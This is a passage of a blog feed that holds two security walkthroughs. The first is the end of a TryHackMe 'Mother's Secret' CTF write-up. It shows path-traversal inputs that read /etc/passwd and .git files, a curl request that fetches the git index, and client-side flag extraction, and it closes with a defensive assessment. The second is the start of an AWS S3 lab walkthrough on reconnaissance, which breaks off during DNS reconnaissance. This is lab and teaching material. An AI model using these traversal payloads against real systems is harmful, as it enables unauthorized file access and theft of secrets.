  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;views&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In itself, this reveals new information about the package structure:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;A folder called &lt;em&gt;views&lt;/em&gt;, which contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt;, the frontend application&lt;/li&gt;
  &lt;li&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt; imports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.min.js&lt;/code&gt; from the same directory, we can also infer that it too lives in &lt;em&gt;views/&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nostromo.js&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yaml.js&lt;/code&gt; both live in a folder called &lt;em&gt;routes&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocket.js&lt;/code&gt; lives in the top-level directory, alongside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;package.json&lt;/code&gt; and the major folders in use&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s update our package structure map:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mothers_secret_challenge/
- routes/
	- nostromo.js
	- yaml.js
- websocket.js
- views/
	- index.html
	- index.min.js?
- public/
	- ?
- mother/
	- ?
- package.json
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, you can also exploit path traversal to probe for information about the underlying filesystem:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../../../../etc/passwd&lt;/code&gt; proves that we are on a Linux or Unix-like system, and reveals a few interesting artifacts. First, the existence of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec2-instance-connect&lt;/code&gt; user implies that the server is an AWS EC2 instance. Second, the existence of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; user implies that this is an Ubuntu instance. Finally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user’s home path of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; implies that our project lives somewhere in &lt;em&gt;/var/www/&lt;/em&gt;, a hunch that is reinforced by the minimum levels of directories needed to traverse to &lt;em&gt;/etc/passwd&lt;/em&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; route. So, this Node project likely exists at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/mothers_secret_challenge&lt;/code&gt;, a common deployment pattern in Linux-based systems.&lt;/li&gt;
  &lt;li&gt;The Ubuntu and Root users both have an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_hosts&lt;/code&gt; file, which implies that the capability to SSH into this box is feasible. (This is also revealed by a quick Nmap scan against the IP address.) However, no private SSH keys exist in common locations, so the capability to SSH into them is limited. Further, if you try to ssh in using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; user, you are denied with a public-key error, which implies that password-based authentication is disabled. Although SSH would be an easy way to pivot around the system, it may prove infeasible for this challenge.&lt;/li&gt;
  &lt;li&gt;Because this is an EC2 instance, we can speculate that at least one YAML configuration file exists, which we can then use in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; route to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isYamlAuthenticated&lt;/code&gt; to &lt;em&gt;true&lt;/em&gt;. The hunch here is predicated by the fact that &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-cloud-init&quot;&gt;EC2 cloud-init files&lt;/a&gt; are often written in YAML format, and likely with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yaml&lt;/code&gt; extension. In this system, inspecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../../../../var/log/cloud-init.log&lt;/code&gt; at line 361 will reveal the existence of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/netplan/50-cloud-init.yaml&lt;/code&gt;, whose relative path to &lt;em&gt;routes/&lt;/em&gt; can be used in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; route to authenticate.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you follow the methodology thus far, you will successfully authenticate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo/mother&lt;/code&gt;, where you will need to dig for the secret file. The instructions imply the existence of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret.txt&lt;/code&gt;, and it may be worth checking that file at this time. (This is actually what I did the first time, and got mother’s secrets before the other flags.)&lt;/p&gt;

&lt;p&gt;However, since this seems like a poorly deployed Node package, it is also worth looking for other components that are commonly used with application projects.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt;, &lt;a href=&quot;https://forums.docker.com/t/docker-compose-yml-or-dockerfile/133015&quot;&gt;Docker configurations&lt;/a&gt;, which may reveal build information and hardcoded secrets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file, which &lt;a href=&quot;https://nodejs.org/en/learn/command-line/how-to-read-environment-variables-from-nodejs&quot;&gt;contains environment variables&lt;/a&gt; and may include hardcoded secrets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; folder and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitignore&lt;/code&gt;, &lt;a href=&quot;https://www.git-scm.com/docs/gitrepository-layout&quot;&gt;artifacts from the Git version-control system&lt;/a&gt;, which may reveal the existence of specific files in the project&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These configurations often exist in the top-level directory of a project, so try to enumerate them one path up from &lt;em&gt;routes/&lt;/em&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../.env.json&lt;/code&gt;: &lt;em&gt;Error&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../Dockerfile&lt;/code&gt;: &lt;em&gt;Error&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../.gitignore&lt;/code&gt;: &lt;em&gt;Found!&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitignore&lt;/code&gt; is found, we can try to enumerate the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; to learn more about the contents of the project. The only &lt;em&gt;potential&lt;/em&gt; caveat is that, if these contents were not committed to Git, they will not appear in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; artifacts. However, since this is a DevSecOps path, it is reasonable to speculate whether VCS triggered the build and deploy process; if so, the Git contents should reveal everything in the project.&lt;/p&gt;

&lt;p&gt;The Git project structure is fairly predictable, and you are welcome to leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; route to pick any of them. For discovery purposes, two files are of particular interest:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git/config&lt;/code&gt;, a flat text file which includes metadata about the project&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git/index&lt;/code&gt;, a binary file which contains strings, notably the paths to files in the project&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s try to inspect the config file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /nostromo HTTP/1.1
Host: http://IP_ADDRESS
Content-Type: application/json
...

{
  &quot;file_path&quot;: &quot;../.git/config&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The contents return, which imply that Git VCS is in use:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 276
ETag: W/&quot;114-l3m2M+q7EwbIe2cuUUG/ULGbdA8&quot;
Vary: Accept-Encoding
Date: Wed, 05 Jun 2024 20:04:56 GMT
Connection: close

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote &quot;origin&quot;]
	url = https://github.com/melmols/mothers_secret_challenge.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch &quot;main&quot;]
	remote = origin
	merge = refs/heads/main
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, I need to stop and make two major call-outs:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt; exists, it is reasonable to continue your black-box assessment by analyzing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index&lt;/code&gt; file. We will do this in a moment. However…&lt;/li&gt;
  &lt;li&gt;If you inspect the URL, you should notice the cleartext path to a Git repository, https://github.com/melmols/mothers_secret_challenge.git&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; suffix from that URL and open it in your browser. The entire project is hosted on a public Github repository. At this point, you can complete the entire CTF by inspecting those files, as all the secrets exist there in clear text.&lt;/p&gt;

&lt;p&gt;This is not a “normal” find for a CTF. However, this is a &lt;em&gt;DevSecOps learning path&lt;/em&gt;; likely, the author of this challenge wants you to understand the importance of hardening your entire CI/CD, including &lt;em&gt;access to the entire repository&lt;/em&gt;, &lt;em&gt;especially&lt;/em&gt; when that repository contains hardcoded secrets (flags).&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note: The user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melmols&lt;/code&gt;, who maintains this repository, also appears in /home/ubuntu/.ssh/authorized_hosts. Based on previous challenges in this learning path, it is possible that they used SSH to deploy the application to this instance.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;You are welcome, and perhaps encouraged, to inspect this repository inside and out, as it may will certainly help you complete the CTF more quickly. However, I feel like this is taking the easy way out, so I will continue with testing the system as a black-grey box.&lt;/p&gt;

&lt;p&gt;Anyway, let’s pretend that the devs have secured the project repository, but deployed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; folder. This is not a good practice. To demonstrate why, lest’s talk about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;From the &lt;a href=&quot;https://git-scm.com/docs/index-format&quot;&gt;Git docs&lt;/a&gt;, you can learn all about the structure of this binary file. Of importance, let’s review the Index Entries:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;An index entry typically represents a file.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To inspect the &lt;em&gt;index&lt;/em&gt; file, you could use something like &lt;a href=&quot;https://www.git-scm.com/docs/git-cat-file&quot;&gt;&lt;em&gt;git cat-file&lt;/em&gt;&lt;/a&gt;. However, this would only work if we had access to the source repository (we’re still pretending that we don’t), or if command injection/shell access were achieveable on the server. Since neither of these conditions are true, we could leverage &lt;em&gt;strings&lt;/em&gt; to get the text content, then filter it as needed with &lt;em&gt;grep&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;To understand the approach here, examine the following shell commands and outputs. In this example, we create an empty repo with two commits. Each commit adds a different file with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yaml&lt;/code&gt; extension. Afterwards, we can dump all strings from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index&lt;/code&gt; binary, and optionally filter by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yaml&lt;/code&gt; patterns:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Create a test repo.
$ mkdir git-test
$ cd git-test
$ git init
Initialized empty Git repository in /.../git-test/.git/

# Create a dummy YAML file and commit it.
$ touch file-a.yaml
$ git add . 
$ git commit -m &quot;initial commit&quot;
[main (root-commit) b037146] initial commit
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 file-a.yaml
 
# Create another file and commit that too.
# Git HEAD will now point to this commit.
$ touch file-b.yaml
$ git add .
$ git commit -m &quot;added a file&quot;
[main 8a56a6d] added a file
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 file-b.yaml
 
# View the names of YAML files from this output.
$ strings .git/index | grep &apos;.yaml&apos;
file-a.yaml
file-b.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, in a black-box engagement, this may prove a feasible way to achieve file enumeration from a simple path-traversal vulnerability. The Git specification makes no claims that entires should be encrypted. So, it is reasonable to assume that the secrets appear in cleartext.&lt;/p&gt;

&lt;p&gt;As noted earlier, you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; to get the contents of any file on the system. But I’m still interested in why the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; functionality exists, especially since the “Alien Loaders” description calls out its importance. To me, this implies that there is a YAML file in the project structure; and we’re going to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index&lt;/code&gt; file contents to prove this one way or another.&lt;/p&gt;

&lt;p&gt;First, fetch the file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -X POST \
	-H &quot;Content-Type: application/json&quot; \
	-H &quot;Accept: application/octet-stream&quot; \
	-d &apos;{&quot;file_path&quot;: &quot;../.git/index&quot;}&apos; \
	-o index.bin \
	http://10.10.120.111/api/nostromo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, inspect the contents for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yaml&lt;/code&gt; files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings index.bin | grep &apos;.yaml&apos;
...
public/100375.yaml
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Indeed, this matches the same “control code” given in the CTF description.&lt;/p&gt;

&lt;p&gt;Now, let’s try to enumerate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.txt&lt;/code&gt; files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings index.bin | grep &apos;.txt&apos;
...
mother/0rd3r937.txt
mother/secret.txt
...
public/0rd3rXXX.txt
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using this enumeration, we have revealed the contents of the following interesting files:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;public/100375.yaml&lt;/em&gt;, which contains a reference to &lt;em&gt;0rd3rXXX.txt&lt;/em&gt;, and implies that the order number is XXX (redacted)&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;public/0rd3rXXX.txt&lt;/em&gt;, which contains the “Nostromo route” flag&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;mother/0rd3rXXX.txt&lt;/em&gt;, which reveals the order number&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;mother/secret.txt&lt;/em&gt;, which contains a reference to &lt;em&gt;/opt/m0th3r&lt;/em&gt;, the location of the “Mother’s secret” flag&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By this point, we have four of the six flags, and have all but exhausted the server-side attack paths given the path-traversal vulnerability. For the final two, let’s inspect the client. As noted, the core frontend logic exists in &lt;em&gt;index.min.js&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;When testing minified JavaScript, it is always a good practice to use a “beautifier” or “unminifier” tool. These tools will not defeat all of the obfuscation or mangling techniques, but it will lay out the code in a way that’s easier to read and inspect.&lt;/p&gt;

&lt;p&gt;With the unminified JS, try to identify key labels, such as variable or function names. Keeping the frontend behavior in mind, try to look for things that could reveal or authenticate the “hidden” content.&lt;/p&gt;

&lt;p&gt;In this case, the following labels should stand out:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;authYaml&lt;/em&gt; and &lt;em&gt;authNostromo&lt;/em&gt;, two variables which are initialized to &lt;em&gt;false&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;yamlSocket and nostromoSocket, websocket instances which interact with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/yaml&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nostromo&lt;/code&gt; websocket routes&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;authWebSocket&lt;/em&gt;, a function which uses these websockets and updates their “authentication” states programmatically, but reverts each &lt;em&gt;auth&lt;/em&gt; variable to &lt;em&gt;false&lt;/em&gt; in such a way that both variables are never &lt;em&gt;true&lt;/em&gt; at the same time&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;modifyData&lt;/em&gt;, a function that executes only when &lt;em&gt;authYaml&lt;/em&gt; and &lt;em&gt;authNostromo&lt;/em&gt; are both &lt;em&gt;true&lt;/em&gt; at the same time&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you inspect the &lt;em&gt;modifyData&lt;/em&gt; arrow function, notice the references to DOM manipulation (&lt;em&gt;querySelector&lt;/em&gt;). This may control the state of hidden files in the client-side application.&lt;/p&gt;

&lt;p&gt;Before probing too far, keep investigating the JS. Notice the massive array defined at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_0x491022&lt;/code&gt;. You’ll notice, among other things, the entire frontend text content, along with some Base64 encoded data, one of which decodes the client-side flag. The scientist’s name is also there, and it should stand out if you watched the first &lt;em&gt;Alien&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Before making assumptions, though, let’s go back to the authentication logic. &lt;em&gt;modifyData&lt;/em&gt; is defined in the global scope. It is callable without any arguments or prerequisite conditions. This makes the need to manage &lt;em&gt;authYaml&lt;/em&gt; and &lt;em&gt;authNostromo&lt;/em&gt; moot, and therefore represents another case of broken access control. It also means that we could execute this in the console and it should execute successfully.&lt;/p&gt;

&lt;p&gt;In a real engagement, you should be careful about how you report this issue. Executing script in the console is not, for example, a Cross-site Scripting finding. The root issue here is not the code, but rather, the &lt;em&gt;hardcoded secrets&lt;/em&gt; in the client code. This attack will already prove what we learned from the array at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_0x491022&lt;/code&gt;: that, likely, &lt;em&gt;modifyData&lt;/em&gt; just reveals the cleartext data stored here.&lt;/p&gt;

&lt;p&gt;In any case, open the Dev Tools and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;modifyData()&lt;/code&gt;. The HTML code now “reveals” the flag and scientist’s name. It does so by taking values from that array and printing them to the console.&lt;/p&gt;

&lt;h1 id=&quot;assessment&quot;&gt;Assessment&lt;/h1&gt;

&lt;p&gt;Overall, this report should focus on the following vulnerable coding patterns:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Hardcoded secrets in the web and source files&lt;/li&gt;
  &lt;li&gt;Lack of identity controls (Authentication), which is necessarily a prerequisite for access control (Authorization)&lt;/li&gt;
  &lt;li&gt;Injection attacks due to unsanitized input, which allows an attacker to traverse files on the system&lt;/li&gt;
  &lt;li&gt;Excessive privileges in the deployed web application, which enables an attacker to traverse files in locations like &lt;em&gt;/etc&lt;/em&gt;, and even in the root user’s folder&lt;/li&gt;
  &lt;li&gt;Nonexistent access controls for the source repository, which enables an attacker to steal the entire source code&lt;/li&gt;
  &lt;li&gt;Deployment of excessive configuration files, which enable an attacker to learn more about the project by merely reading those files&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Clearly, the frontend and backend developers mistake the secrecy of their business workflows as a proof of identity. They would benefit from hardening their CI/CD process, from using a SAST and Secrets scanner, and from implementing identity and access management.&lt;/p&gt;</content><author><name></name></author><summary type="html">Overview of “Mother’s Secrets”</summary></entry><entry><title type="html">TryHackMe AWS S3 Walkthrough</title><link href="http://localhost:4000/2024/01/16/thm-aws-s3-walkthrough.html" rel="alternate" type="text/html" title="TryHackMe AWS S3 Walkthrough" /><published>2024-01-16T00:00:00-05:00</published><updated>2024-01-16T00:00:00-05:00</updated><id>http://localhost:4000/2024/01/16/thm-aws-s3-walkthrough</id><content type="html" xml:base="http://localhost:4000/2024/01/16/thm-aws-s3-walkthrough.html">&lt;p&gt;This guide will walk you through the AWS S3 labs’ campaign. The intention is to lay out the attack steps as a methodology with a more natural flow than the labs, which fragment the process as it is broken into different sections.&lt;/p&gt;

&lt;p&gt;Our scope is &lt;em&gt;bestcloudcompany.org&lt;/em&gt; along with all testable AWS components. We will try to focus on all aspects of the campaign, keeping an eye towards AWS-specific components as they appear.&lt;/p&gt;

&lt;h2 id=&quot;background-and-methodology&quot;&gt;Background and Methodology&lt;/h2&gt;

&lt;p&gt;The &lt;em&gt;TryHackMe&lt;/em&gt; labs offer a few approaches for targeting S3 buckets specifically during an assessment:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Subdomain Enumeration&lt;/strong&gt;. This can lead, either directly or indirectly, to a valid and open S3 bucket. The usefulness of such buckets will rely entirely on their permissions—or, rather, their &lt;em&gt;lack&lt;/em&gt; of permissions. You can leverage tools like the &lt;a href=&quot;https://crt.sh&quot;&gt;Crt.sh&lt;/a&gt; to help with your enumeration efforts.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DNS Reconnaissance&lt;/strong&gt;. This can help you map IPs to valid AWS Services and, conversely, URLs to such IPs. You can use tools like &lt;em&gt;nslookup&lt;/em&gt; for IPs and domains or subdomains. AWS Service artifacts will include key terms like “ec2” or “s3.”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will leverage these hints in order to discover any public buckets as appropriate.&lt;/p&gt;

&lt;p&gt;Although this is intended for offensive strategy for S3 buckets, try to approach this as a more “holistic” penetration test or application assessment. Approaching such an assessment without assumptions, even in a lab, will provide you with an opportunity to see the larger picture and will lead to better findings. This will serve you in real-world situations and, in my personal opinion, serve to enrich the labs provided by THM.&lt;/p&gt;

&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;

&lt;p&gt;The THM guide recommends two approaches for S3 bucket discovery: DNS Recon and Subdomain enumeration. These are both useful for discovering evidence of AWS services.&lt;/p&gt;

&lt;p&gt;Before we approach these, let’s see what our scoped domain is &lt;em&gt;supposed&lt;/em&gt; to do. This will give us an idea of the developers’ intentions and help us understand any blind spots along the way.&lt;/p&gt;

&lt;h3 id=&quot;open-services&quot;&gt;Open services&lt;/h3&gt;

&lt;p&gt;You can run &lt;em&gt;nmap&lt;/em&gt; against the URL:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ nmap -Pn bestcloudcompany.org
...
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The only open ports are web ports. This is incredibly useful as it narrows the scope of our reconnaissance and, later, our exploit approaches. These results also shed some light on the developers’ intentions, as well as any assumptions or pitfalls.&lt;/p&gt;

&lt;p&gt;In short, we have a web application. Let’s check it out.&lt;/p&gt;

&lt;h3 id=&quot;application&quot;&gt;Application&lt;/h3&gt;

&lt;p&gt;First, let’s open &lt;em&gt;bestcloudcompany.org&lt;/em&gt; in a browser. Observe that this is a landing page with a blog and some small capabilities.&lt;/p&gt;

&lt;p&gt;Scroll down and observe that this is “powered by WordPress.” This is a bad sign already since WordPress is notoriously insecure by default and the platform is the subject of many AppSec trainings. That aside, it also means that some WordPress functionality may be available to the public internet. For example, try to open http://bestcloudcompany.org/wp-login.php, a well-known WordPress login URI.&lt;/p&gt;

&lt;p&gt;The login page loads. If you were doing a more AppSec-focused assessment, you might try password brute-forcing or injection attacks to bypass this page.&lt;/p&gt;

&lt;p&gt;You are welcome to play around with any other WordPress quirks or functionalities. In this case, let’s make a note of this capability and return to it later.&lt;/p&gt;

&lt;p&gt;Note that you could use a tool like Burp Suite or OWASP ZAP to enumerate both traffic and page content. This would be appropriate to discovering open and insecure services, including AWS Services, through page content or request-response history. Preferably, you would want to walk through the webapp yourself, and leverage crawlers as appropirate.&lt;/p&gt;

&lt;p&gt;In my case, no evidence of AWS Services appeared in the the page history or content. (However, I have performed assessments where the developers refer directly to S3 buckets, so it’s worth trying this in a real-world web pentest.) This is a dead end. Let’s move on to other recon tactics.&lt;/p&gt;

&lt;h3 id=&quot;subdomain-enumeration&quot;&gt;Subdomain Enumeration&lt;/h3&gt;

&lt;p&gt;Now, let’s try to find any subdomains associated with the site or organization. Often, subdomains point to additional resources for the organization, including webpage content, webapp resources, and separate applications. Sometimes, they point to storage units that hold backups or secrets.&lt;/p&gt;

&lt;p&gt;Let’s start by using &lt;em&gt;Crt.sh&lt;/em&gt; to enumerate any subdomains discovered by certificate transparency logs. Open the site and search for &lt;em&gt;bestcloudcompany.org&lt;/em&gt;. Results are listed &lt;a href=&quot;https://crt.sh/?q=bestcloudcompany.org&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Observe that &lt;em&gt;assets.bestcloudcompany.org&lt;/em&gt; appears. Based solely on the name, we can speculate whether this is used to store information for the organization’s website.&lt;/p&gt;

&lt;p&gt;There are other subdomains listed, and you are welcome to try them. None of them loaded anything for me (&lt;em&gt;nmap&lt;/em&gt;, browser, etc.), so they weren’t actionable in this assessment. Let’s proceed with the &lt;em&gt;assets&lt;/em&gt; subdomain.&lt;/p&gt;

&lt;p&gt;A simple &lt;em&gt;nmap&lt;/em&gt; scan will report that, again, ports 80 and 443 are open. However, if you try to load these in the browser, nothing happens. Still, this is indicative that &lt;em&gt;something&lt;/em&gt; is there, so let’s try to push this a little further.&lt;/p&gt;

&lt;h3 id=&quot;dns-reconnaissance&quot;&gt;DNS Reconnaissance&lt;/h3&gt;

&lt;p&gt;First, let’s use &lt;em&gt;nslookup&lt;/em&gt; on the &lt;em&gt;bestcloudcompany.org&lt;/em&gt; domain. Take one of the IPs and then perform the same thing to view more information about who is hosting this:&lt;/p&gt;

